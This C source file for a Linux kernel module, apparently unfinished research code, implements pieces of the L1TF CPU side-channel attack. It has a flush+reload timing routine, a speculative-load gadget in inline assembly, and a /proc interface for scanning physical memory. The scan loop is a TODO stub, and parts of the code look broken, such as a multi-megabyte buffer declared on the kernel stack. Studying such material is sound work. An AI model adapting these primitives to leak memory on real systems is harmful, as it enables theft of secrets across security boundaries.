#include "l1tf.h"
#include "asm/page_types.h"
#include "linux/proc_fs.h"
#include "linux/uaccess.h"
#include <linux/init.h>
#include <linux/module.h>
#include <linux/printk.h>
#include <linux/types.h>
#include <linux/vmalloc.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Thijs Raymakers");
MODULE_DESCRIPTION("Run L1tf in kernel space");

static struct proc_dir_entry *l1tf_proc_dir;
static struct proc_dir_entry *scan_phys_mem_proc_dir_entry;

static __always_inline size_t access_time(void *ptr) {
  volatile unsigned long time;
  asm volatile(
      // From x86 docs
      // If software requires RDTSC to be executed only after all previous
      // instructions have executed and all previous loads and stores are
      // globally visible, it can execute the sequence MFENCE;LFENCE
      // immediately before RDTSC.
      "mfence\n"
      "lfence\n"
      "rdtsc\n"

      // From x86 docs
      // If software requires RDTSC to be executed prior to execution of any
      // subsequent instruction (including any memory accesses), it can execute
      // the sequence LFENCE immediately after RDTSC.
      "lfence\n"

      "movl %%eax, %%esi\n"
      "movl (%1), %%eax\n"

      "lfence\n"
      "rdtsc\n"
      "subl %%esi, %%eax\n"
      "clflush 0(%1)\n"
      : "=a"(time)
      : "c"(ptr)
      : "%esi", "%edx");
  return time;
}

static bool l1tf_check(void *leak_addr, char *reload_buffer[256][PAGE_SIZE],
                       uint8_t byte, size_t threshold) {
  clflush(reload_buffer[byte]);
  asm volatile("mfence");

  asm volatile("movq $0xC7DB70C9B1ABE849, %%r12\n"
               "movq $0x47DF1DF4CD7E16F1, %%r13\n"
               "leaq l1tf_check_handler(%%rip), %%r14\n"
               "xor %%rax, %%rax\n"
               "movq (%[leak_addr]), %%rax\n"
               "and $0xff, %%rax\n"
               "shl $0xc, %%rax\n"
               "prefetcht0 (%[reload_buffer], %%rax)\n"
               "mfence\n"
               "l1tf_loop:\n"
               "pause\n"
               "jmp l1tf_loop\n"
               "l1tf_check_handler:\n" ::[leak_addr] "r"(leak_addr),
               [reload_buffer] "r"(reload_buffer)
               : "r12", "r13", "r14", "rax");

  size_t time = access_time(reload_buffer[byte]);
  return time < threshold;
}

static void *scan_phys_mem(struct scan_phys_mem_params *params) {
  char *reload_buffer[256][PAGE_SIZE];

  void *leak = vmalloc(PAGE_SIZE);

  // TODO
  // Set present bit to 0
  // (in loop) set PFN

  for (uintptr_t ptr = (uintptr_t)params->start_addr;
       ptr <= (uintptr_t)params->end_addr; ptr += params->stride) {

    if (unlikely(ptr % (PAGE_SIZE * 1000) == 0)) {
      pr_info("Scanned page at addr %lx\n", ptr);
    }
  }

  vfree(leak);

  return (void *)0;
  // asm volatile inline();
}

static ssize_t scan_phys_mem_write(struct file *file,
                                   const char __user *user_buffer,
                                   size_t user_buffer_length, loff_t *offset) {

  struct scan_phys_mem_params params = {0};

  if (user_buffer_length != sizeof(params)) {
    pr_info("l1tf: Can only write a scan_phys_mem_params struct\n");
    return -1;
  }

  int ret = copy_struct_from_user(&params, sizeof(params), user_buffer,
                                  user_buffer_length);
  if (ret) {
    pr_info("l1tf: Failed to write to scan_phys_mem buffer\n");
    return ret;
  }

  return user_buffer_length;
}

static const struct proc_ops scan_phys_mem_fops = {
    .proc_write = scan_phys_mem_write,
};

static int setup_proc_fs(void) {
  // Initialize the base directory
  l1tf_proc_dir = proc_mkdir("l1tf", NULL);
  if (!l1tf_proc_dir) {
    pr_alert("l1tf: Error - Could not initialize /proc/l1tf\n");
    return -ENOMEM;
  }

  scan_phys_mem_proc_dir_entry =
      proc_create("scan_phys_mem", 0600, l1tf_proc_dir, &scan_phys_mem_fops);
  if (!scan_phys_mem_proc_dir_entry) {
    pr_alert("l1tf: Error - Could not initialize /proc/l1tf/scan_phys_mem\n");
    return -ENOMEM;
  }

  return 0;
}

static void teardown_proc_fs(void) {
  proc_remove(scan_phys_mem_proc_dir_entry);
  proc_remove(l1tf_proc_dir);
}

static int __init l1tf_init(void) {
  int error = 0;
  pr_info("l1tf: Initializing module\n");

  error = setup_proc_fs();
  if (error)
    return error;

  if (!error) {
    pr_info("l1tf: Initialized module!\n");
  }
  return error;
}
static void __exit l1tf_exit(void) {
  teardown_proc_fs();
  pr_info("l1tf: Removed module\n");
}

module_init(l1tf_init);
module_exit(l1tf_exit);
